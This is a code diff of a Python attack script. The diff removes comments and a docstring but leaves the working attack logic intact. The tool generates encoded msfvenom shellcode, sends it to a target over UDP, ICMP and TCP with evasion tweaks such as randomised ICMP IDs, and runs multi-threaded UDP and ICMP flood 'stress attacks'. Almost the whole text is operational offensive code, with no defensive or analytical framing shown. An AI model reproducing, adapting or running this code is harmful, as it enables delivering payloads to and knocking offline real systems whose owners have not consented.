@@ -10,7 +10,6 @@ def xor_encrypt(data, key):
     return bytearray([b ^ key for b in data])
 
 def generate_shellcode(payload, lhost, lport):
-    # Use msfvenom to generate the shellcode with optimized encoding
     command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 3 -f raw"
     result = subprocess.run(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     if result.returncode != 0:
@@ -19,7 +18,7 @@ def generate_shellcode(payload, lhost, lport):
 
 def send_shellcode_via_udp(shellcode, target_ip, target_port, num_packets, burst_interval):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)  # Max UDP buffer
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
     for i in range(num_packets):
         try:
             sock.sendto(shellcode, (target_ip, target_port))
@@ -33,7 +32,6 @@ def send_shellcode_via_udp(shellcode, target_ip, target_port, num_packets, burst
 
 def send_shellcode_via_icmp(shellcode, target_ip, num_packets, burst_interval):
     for i in range(num_packets):
-        # Randomize ICMP ID and sequence for better evasion
         pkt = IP(dst=target_ip)/ICMP(id=RandShort(), seq=RandShort())/Raw(load=shellcode)
         try:
             send(pkt, verbose=False)
@@ -46,10 +44,10 @@ def send_shellcode_via_icmp(shellcode, target_ip, num_packets, burst_interval):
 
 def send_shellcode_via_tcp(shellcode, target_ip, target_port):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.settimeout(10)  # Add timeout
+        s.settimeout(10)
         try:
             s.connect((target_ip, target_port))
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Disable Nagle's algorithm
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.sendall(shellcode)
             print(f"[+] Shellcode sent to {target_ip}:{target_port} via TCP")
         except Exception as e:
@@ -63,20 +61,10 @@ def _send_packet(sock, packet, target):
         return False
 
 def stress_attack(target_ip, target_port, duration, protocol='udp', packet_size=1024):
-    """
-    Execute a multi-threaded stress attack using specified protocol
-    
-    Args:
-        target_ip (str): Target IP address
-        target_port (int): Target port number 
-        duration (int): Attack duration in seconds
-        protocol (str): Protocol to use ('udp' or 'icmp')
-        packet_size (int): Size of random packet payload in bytes
-    """
     end_time = time.time() + duration
     packet = os.urandom(packet_size)
     threads = []
-    max_threads = os.cpu_count() * 2  # Optimize thread count based on CPU cores
+    max_threads = os.cpu_count() * 2
     
     if protocol == 'udp':
         def udp_flood():
@@ -119,6 +107,5 @@ def stress_attack(target_ip, target_port, duration, protocol='udp', packet_size=
             threads.append(t)
             t.start()
 
-    # Wait for all threads to complete
     for t in threads:
         t.join()
